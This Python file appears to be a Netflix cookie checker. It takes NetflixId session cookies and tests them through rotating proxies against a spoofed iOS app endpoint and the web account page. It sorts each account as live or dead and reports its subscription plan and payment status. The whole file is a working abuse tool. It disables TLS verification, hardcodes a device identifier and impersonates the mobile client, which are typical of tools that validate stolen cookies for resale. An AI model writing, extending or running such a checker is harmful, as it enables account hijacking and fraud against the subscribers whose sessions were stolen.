import requests
import time
import json
import proxies_list

NETFLIX_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

# Global flag: once we know API is dead, skip it entirely to save time
_api_is_dead = False

def check_account_live(netflix_id, secure_netflix_id="", check_payment=False):
    global _api_is_dead
    
    cookies = {"NetflixId": netflix_id}
    if secure_netflix_id:
        cookies["SecureNetflixId"] = secure_netflix_id
    
    proxy_dict = proxies_list.get_random_proxy()
    
    if not _api_is_dead:
        try:
            plan = _get_token_and_plan_api(netflix_id, proxy_dict)
            if plan == "API_DEAD":
                _api_is_dead = True
                print("iOS API is dead (404). Switching to web-only check mode.")
            elif plan is None:
                return "DIE", None
            elif plan == "ERROR":
                return "ERROR", None
            else:
                if check_payment:
                    try:
                        payment_status = _check_live_web(cookies, proxy_dict)
                        if payment_status == "DIE":
                            return "DIE", None
                    except Exception as e:
                        print(f"Web Payment Check Error: {e}")
                return "LIVE", plan if plan != "VALID" else None
        except Exception as e:
            print(f"API Check Error: {e}")
            return "ERROR", None

    try:
        result = _check_live_web(cookies, proxy_dict)
        if result == "DIE":
            return "DIE", None
        elif result == "ERROR":
            return "ERROR", None
        plan = _get_plan_from_web(cookies, proxy_dict)
        return "LIVE", plan
    except Exception as e:
        print(f"Web Check Error: {e}")
        return "ERROR", None


def _check_live_web(cookies, proxy_dict):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        response = requests.get(
            "https://www.netflix.com/YourAccount",
            cookies=cookies,
            headers=headers,
            proxies=proxy_dict,
            allow_redirects=True,
            timeout=15
        )
        url_lower = response.url.lower()
        if "netflix.com/login" in url_lower or "/clearcookies" in url_lower:
            return "DIE"
        if "paymentupdate" in url_lower or "payment-update" in url_lower or "billing-update" in url_lower:
            return "DIE"
        return "LIVE"
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError):
        return "ERROR"
    except Exception as e:
        raise e


def _get_plan_from_web(cookies, proxy_dict):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        response = requests.get(
            "https://www.netflix.com/YourAccount",
            cookies=cookies,
            headers=headers,
            proxies=proxy_dict,
            allow_redirects=True,
            timeout=15
        )
        text_lower = response.text.lower()
        if "premium" in text_lower or "ultra" in text_lower:
            return "Premium"
        elif "standard with ads" in text_lower or "standard_ads" in text_lower:
            return "Standard_Ads"
        elif "standard" in text_lower:
            return "Standard"
        elif "basic" in text_lower:
            return "Basic"
        return None
    except Exception:
        return None


def _get_token_and_plan_api(netflix_id, proxy_dict):
    params = {
        "appVersion": "15.48.1",
        "config": "{\"gamesInTrailersEnabled\":\"false\"}",
        "device_type": "NFAPPL-02-",
        "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "idiom": "phone",
        "iosVersion": "15.8.5",
        "isTablet": "false",
        "languages": "en-US",
        "locale": "en-US",
        "maxDeviceWidth": "375",
        "model": "saget",
        "modelType": "IPHONE8-1",
        "odpAware": "true",
        "path": "[\"account\",\"token\",\"default\"]",
        "pathFormat": "graph",
        "pixelDensity": "2.0",
        "progressive": "false",
        "responseFormat": "json",
    }
    headers = {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "Cookie": f"NetflixId={netflix_id}",
        "x-netflix.request.attempt": "1",
        "x-netflix.context.app-version": "15.48.1",
        "x-netflix.context.locales": "en-US",
        "accept-language": "en-US;q=1",
    }
    try:
        response = requests.get(
            NETFLIX_API_URL,
            params=params,
            headers=headers,
            proxies=proxy_dict,
            timeout=15,
            verify=False
        )
        if response.status_code == 404:
            return "API_DEAD"
        if response.status_code in [403, 429] or response.status_code >= 500:
            return "ERROR"
        if not response.ok:
            return None
        data = response.json()
        data_str = json.dumps(data).lower()
        exact_die_indicators = [
            "\"on_hold\"", "\"canceled\"", "\"former_member\"", "\"never_member\"",
            "\"cancelled\"", "\"delinquent\"", "\"status\":\"hold\"", "\"status\":\"inactive\""
        ]
        for indicator in exact_die_indicators:
            if indicator in data_str:
                return None
        token_data = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        token = token_data.get("token")
        if not token:
            return None
        if "\"premium\"" in data_str or "\"ultra\"" in data_str:
            return "Premium"
        elif "\"standard with ads\"" in data_str or "\"standard_ads\"" in data_str:
            return "Standard_Ads"
        elif "\"standard\"" in data_str:
            return "Standard"
        elif "\"basic\"" in data_str:
            return "Basic"
        return "VALID"
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError):
        return "ERROR"
    except Exception as e:
        print(f"Token API error: {e}")
        return "ERROR"
